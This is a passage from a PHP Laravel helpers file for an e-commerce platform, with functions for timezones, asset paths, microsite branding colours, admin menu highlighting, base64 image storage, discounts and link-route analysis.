        '(GMT+08:00) Chongqing' => 'Asia/Chongqing',
        '(GMT+08:00) Hong Kong' => 'Asia/Hong_Kong',
        '(GMT+08:00) Irkutsk' => 'Asia/Irkutsk',
        '(GMT+08:00) Kuala Lumpur' => 'Asia/Kuala_Lumpur',
        '(GMT+08:00) Perth' => 'Australia/Perth',
        '(GMT+08:00) Singapore' => 'Asia/Singapore',
        '(GMT+08:00) Taipei' => 'Asia/Taipei',
        '(GMT+08:00) Ulaan Bataar' => 'Asia/Irkutsk',
        '(GMT+08:00) Urumqi' => 'Asia/Urumqi',
        '(GMT+09:00) Osaka' => 'Asia/Tokyo',
        '(GMT+09:00) Sapporo' => 'Asia/Tokyo',
        '(GMT+09:00) Seoul' => 'Asia/Seoul',
        '(GMT+09:00) Tokyo' => 'Asia/Tokyo',
        '(GMT+09:00) Yakutsk' => 'Asia/Yakutsk',
        '(GMT+09:30) Adelaide' => 'Australia/Adelaide',
        '(GMT+09:30) Darwin' => 'Australia/Darwin',
        '(GMT+10:00) Brisbane' => 'Australia/Brisbane',
        '(GMT+10:00) Canberra' => 'Australia/Sydney',
        '(GMT+10:00) Guam' => 'Pacific/Guam',
        '(GMT+10:00) Hobart' => 'Australia/Hobart',
        '(GMT+10:00) Melbourne' => 'Australia/Melbourne',
        '(GMT+10:00) Port Moresby' => 'Pacific/Port_Moresby',
        '(GMT+10:00) Sydney' => 'Australia/Sydney',
        '(GMT+10:00) Vladivostok' => 'Asia/Vladivostok',
        '(GMT+11:00) Magadan' => 'Asia/Magadan',
        '(GMT+11:00) New Caledonia' => 'Asia/Magadan',
        '(GMT+11:00) Solomon Is.' => 'Asia/Magadan',
        '(GMT+12:00) Auckland' => 'Pacific/Auckland',
        '(GMT+12:00) Fiji' => 'Pacific/Fiji',
        '(GMT+12:00) Kamchatka' => 'Asia/Kamchatka',
        '(GMT+12:00) Marshall Is.' => 'Pacific/Fiji',
        '(GMT+12:00) Wellington' => 'Pacific/Auckland',
        '(GMT+13:00) Nuku\'alofa' => 'Pacific/Tongatapu'
    );

    return $timezones;
}

if (!function_exists('app_timezone')) {
    function app_timezone()
    {
        return config('app.timezone');
    }
}
if (!function_exists('my_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function my_asset($path, $secure = null)
    {
        if (env('FILESYSTEM_DRIVER') == 's3') {
            return Storage::disk('s3')->url($path);
        } else {
            return app('url')->asset($path, $secure);
        }
    }
}
if (!function_exists('static_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function static_asset($path, $secure = null)
    {
        return app('url')->asset('assets/' . $path, $secure);
    }
}
if (!function_exists('isUnique')) {
    /**
     * Generate an asset path for the application.
     *
     * @param string $path
     * @param bool|null $secure
     * @return string
     */
    function isUnique($email)
    {
        $user = \App\User::where('email', $email)->first();
        if ($user == null) {
            return '1'; // $user = null means we did not get any match with the email provided by the user inside the database
        } else {
            return '0';
        }
    }
}

/**
 * highlights the selected sub navigation on admin menu.
 *
 * @param string $route
 * @param string|null $output
 * @return string
 */
if (!function_exists('checkActiveSubItem')) {
    function checkActiveSubItem($route, $output = "active-link")
    {
        $currentRouteName = Route::currentRouteName();
        if (strpos($currentRouteName, $route) !== false) {
            return $output;
        }
        return '';
    }
}

/**
 * highlights the selected navigation on admin menu.
 *
 * @param string $route
 * @param string|null $output
 * @return string
 */
if (!function_exists('checkActiveItem')) {
    function checkActiveItem($route, $output = "active")
    {
        $currentRouteName = Route::currentRouteName();
        if (strpos($currentRouteName, $route) === 0) {
            return $output;
        }
        return '';
    }
}

if (!function_exists('isMicrosite')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function isMicrosite(): bool
    {
        return (Session::has('isMicrosite') && Session::get('isMicrosite'));
    }
}


if (!function_exists('getMicrositeShop')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getMicrositeShop()
    {
        return Session::get('shop');
    }
}

if (!function_exists('getMicrositeSlug')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getMicrositeSlug(): string
    {
        return getMicrositeShop()->slug;
    }
}

if (!function_exists('getMicrosite')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getMicrosite()
    {
        return Session::get('microsite');
    }
}

if (!function_exists('getMainColor')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getMainColor(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->color)) {
            return getMicrosite()->color;
        }
        return \App\Models\GeneralSetting::first()->frontend_color;
    }
}

if (!function_exists('getSecondaryColor')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getSecondaryColor(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->second_color)) {
            return getMicrosite()->second_color;
        }
        return \App\Models\GeneralSetting::first()->frontend_secondary_color;
    }
}

if (!function_exists('getMainColorHover')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getMainColorHover(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->color)) {
            return getMicrosite()->color;
        }
        return \App\Models\GeneralSetting::first()->frontend_color_hover;
    }
}

if (!function_exists('getMenuBarAreaColor')) {
    /**
     * Get BG color of menu bar
     */
    function getMenuBarAreaColor(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->color)) {
            return getMicrosite()->color;
        }
        return \App\Models\GeneralSetting::first()->color_menu_bar_area;
    }
}

if (!function_exists('getMenuBarMainColor')) {
    /**
     * Get main color of menu bar
     */
    function getMenuBarMainColor(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->color)) {
            return getMicrosite()->color;
        }
        return \App\Models\GeneralSetting::first()->color_menu_bar_main;
    }
}

if (!function_exists('getMenuBarTextColor')) {
    /**
     * Get text color of menu bar
     */
    function getMenuBarTextColor(): string
    {
        if (isMicrosite() && !empty(getMicrosite()->color)) {
            return getMicrosite()->color;
        }
        return \App\Models\GeneralSetting::first()->color_menu_bar_text;
    }
}

if (!function_exists('getAppName')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getAppName(): string
    {
        return isMicrosite() ? getMicrositeShop()->name : config('app.name');
    }
}

if (!function_exists('getAppLogo')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getAppLogo(): string
    {
        return isMicrosite() ? my_asset(getMicrositeShop()->logo) : 'https://ysg.com.sg/uploads/logo/lMwx605gxECGzasJXDo0U7vliDoNNMCOxrXHHUbj.png';
    }
}

if (!function_exists('getAppFavicon')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getAppFavicon(): string
    {
        return (isMicrosite() && !empty(getMicrosite()->favicon)) ? my_asset(getMicrosite()->favicon) : my_asset(\App\Models\GeneralSetting::first()->favicon);
    }
}

if (!function_exists('getAppHomepageLink')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getAppHomepageLink(): string
    {
        return isMicrosite() ? route('microsite.index', ['slug' => getMicrositeShop()->slug]) : route('home');
    }
}

if (!function_exists('getShopLink')) {
    /**
     * Check if current session is microsite or not
     *
     */
    function getShopLink($slug): string
    {
        return isMicrosite() ? route('microsite.index', ['slug' => getMicrositeShop()->slug]) : route('shop.visit', ['slug' => $slug]);
    }
}

if (!function_exists('sellerCenterSetting')) {
    function sellerCenterSetting($key = null, $default = null)
    {
        if (is_null($key)) {
            return app('sellerCenterSetting');
        }
        return app('sellerCenterSetting')->get($key, $default);
    }
}

if (!function_exists('paymentSetting')) {
    function paymentSetting($key = null, $default = null)
    {
        if (is_null($key)) {
            return app('paymentSetting');
        }
        return app('paymentSetting')->get($key, $default);
    }
}

if (!function_exists('checkNullThenCompareValue')) {
    function checkNullThenCompareValue($array, $key, $value):bool {
        return ($array[$key] ?? null) == $value;
    }
}

if (!function_exists('generateAddBlockToPageUrl')) {
    function generateAddBlockToPageUrl($pageType, $id)
    {
        switch ($pageType) {
            case 'microsite':
                return route('admin.api.microsites.block.add', $id);
            case 'page':
                return route('admin.api.custom_page.page.block.add', $id);
            case 'shop':
                return route('admin.api.shop.block.add', $id);
        }
    }
}

if (!function_exists('generateRemoveBlockToPageUrl')) {
    function generateRemoveBlockToPageUrl($pageType, $id)
    {
        switch ($pageType) {
            case 'microsite':
                return route('admin.api.microsites.block.remove', $id);
            case 'page':
                return route('admin.api.custom_page.page.block.remove', $id);
            case 'shop':
                return route('admin.api.shop.block.remove', $id);
        }
    }
}

if (!function_exists('generateUpdateIndexBlockToPageUrl')) {
    function generateUpdateIndexBlockToPageUrl($pageType, $id)
    {
        switch ($pageType) {
            case 'microsite':
                return route('admin.api.microsites.block.update_index', $id);
            case 'page':
                return route('admin.api.custom_page.page.block.update_index', $id);
            case 'shop':
                return route('admin.api.shop.block.update_index', $id);
        }
    }
}

//for selected value
if (!function_exists('selected')) {
    function selected($compareValue, $value = null): string
    {
        $selected = '';
        if ($compareValue) {
            if (is_array($value)) {
                $keys = array_keys($value);
                $selected = (in_array($compareValue, $value) || in_array($keys, $value)) ? 'selected' : '';
            } else {
                $selected = ($value == $compareValue) ? 'selected' : '';
            }
        }
        return $selected;
    }
}

//Store base64 data as image file
if (!function_exists('isBase64Image')) {
    function isBase64Image($img): bool
    {
        try {
            $image_parts = explode(";base64,", $img);
            $image_type_aux = explode("image/", $image_parts[0]);
            $image_type = $image_type_aux[1];

            if (in_array($image_type, ['jpeg','jpg','png'])) {
                return true;
            }
        } catch (\Exception $e) {
            return false;
        }
        return false;
    }
}

//Store base64 data as image file
if (!function_exists('storeBase64Image')) {
    function storeBase64Image($folderPath, $img): string
    {
        $image_parts = explode(";base64,", $img);
        $image_type_aux = explode("image/", $image_parts[0]);
        $image_type = $image_type_aux[1];
        $image_base64 = base64_decode($image_parts[1]);
        $filePath = $folderPath.'/'.time().rand(11111,99999).'.'.$image_type;
        $status = Illuminate\Support\Facades\Storage::put($filePath, $image_base64);
        return ($status)?'/'.$filePath:'';
    }
}

if (!function_exists('getSessionLanguageCode')) {
    function getSessionLanguageCode()
    {
        $generalSetting     = \App\Models\GeneralSetting::first();
        $defaultLanguage    = isset($generalSetting->default_language) ? $generalSetting->default_language : NULL;
        return session('locale') ? session('locale') : (isset($defaultLanguage) && !session('locale') ? $defaultLanguage : NULL);
    }
}

if (!function_exists('getProductTranslationNameAttributeWithId')) {
    function getProductTranslationNameAttributeWithId($id)
    {
        $product =\App\Models\Product::find($id);
        return $product->translation_name;
    }
}

if (!function_exists('getProductTranslationDescriptionAttributeWithId')) {
    function getProductTranslationDescriptionAttributeWithId($id)
    {
        $product =\App\Models\Product::find($id);
        return $product->translation_description;
    }
}

if (!function_exists('getHistoryUpdatedFields')) {
    function getHistoryUpdatedFields($value)
    {
        return implode(', ', array_keys((array)json_decode($value)));
    }
}

if (!function_exists('convertTextareaToArrayByLine')) {
    function convertTextareaToArrayByLine($text)
    {
        return preg_split("/\\r\\n|\\r|\\n/", $text);
    }
}

if (!function_exists('isTextStartWith')) {
    function isTextStartWith($text, $str)
    {
        $strLength = strlen($str);
        return substr($text, 0, $strLength) === $str;
    }
}

if (!function_exists('isVariantID')) {
    function isVariantID($idStr)
    {
        return isTextStartWith($idStr, 'v-');
    }
}

if (!function_exists('getVariantID')) {
    function getVariantID($idStr)
    {
        return substr($idStr, 2);
    }
}

if (!function_exists('getProductImagePath')) {
    function getProductImagePath($id)
    {
        $path = config('constant.product_photo_path_individual');

        return $path . "/$id/";
    }
}

if (!function_exists('getProductImageThumbnailPath')) {
    function getProductImageThumbnailPath($id)
    {
        $path = config('constant.product_photo_path_individual');

        return $path . "/$id/thumbnail/";
    }
}


if (!function_exists('calculateFinalPriceBaseOnDiscount')) {
    function calculateFinalPriceBaseOnDiscount($discount, $discountType, $price)
    {
        if (empty($discount) || empty($discountType)) {
            return (float)$price;
        }

        if ($discountType === Product::DISCOUNT_TYPE_AMOUNT) {
            return (float)$price - $discount;
        } else {
            return (float)$price - ($price * $discount / 100);
        }
    }
}

function getAssetVersion() {
    return config('app.asset_version', '1.0.0');
}

function static_asset_with_version($path) {
    return static_asset($path) . '?v=' . getAssetVersion();
}

if (!function_exists('analyzeLinkRoute')) {
    /**
     * Analyze link and determine if it's internal route or external link
     * Can handle both string link or object with link property
     *
     * @param string|object $data
     * @return object
     */
    function analyzeLinkRoute($data)
    {
        if (is_object($data)) {
            $options = clone $data;
            $link = $options->link ?? null;
        } else {
            $options = (object)[];
            $link = $data;
        }

        if (empty($link)) {
            $options->link = null;
            $options->route = null;
            $options->action_type = null;
            return $options;
        }

        $fullUrl = url($link);
        $request = \Illuminate\Http\Request::create($fullUrl);
        $host = $request->getHost();

        $options->link = $fullUrl;
        $options->action_type = null;

        if (stripos($host, 'ysg') !== false) {
            try {
                $route = \Illuminate\Support\Facades\Route::getRoutes()->match($request);
                $routeName = $route->getName();
                $options->action_type = 'internal_route';
                switch ($routeName) {
                    case 'custom-pages.show_custom_page':
                        $options->action_type = 'custom_page';
                        $options->slug = $route->parameter('slug');
                        break;
                    case 'shop.visit':
                        $options->action_type = 'shop';
                        $shopService = app(ShopService::class);
                        $shop = $shopService->findBy('slug', $route->parameter('slug'));
                        $options->id = $shop->user->seller->id;
                        break;
                    case 'product':
                        $options->action_type = 'product';
                        $productService = app(ProductService::class);
                        $product = $productService->findBy('slug', $route->parameter('slug'));
                        $options->id = $product->id;
                        break;
                    default:
                        $options->action_type = 'external_link';
                }
            } catch (\Exception $e) {
                $options->action_type = 'external_link';
            }
        } else {
            $options->action_type = 'external_link';
        }

        return $options;
    }
}
